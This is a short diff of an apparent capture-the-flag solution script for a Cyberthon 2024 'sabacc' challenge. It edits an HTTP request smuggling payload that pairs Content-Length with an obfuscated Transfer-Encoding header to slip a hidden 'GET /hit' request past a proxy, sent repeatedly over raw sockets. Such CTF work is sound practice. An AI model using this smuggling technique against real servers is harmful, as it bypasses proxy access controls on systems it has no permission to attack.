@@ -249,7 +249,7 @@ import socket
 
 # The proxy port is 4941
 
-payload = b"""GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:"""
+payload = b"""GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:<insert-malbyte-here>chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:"""
 
 for i in range(30):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
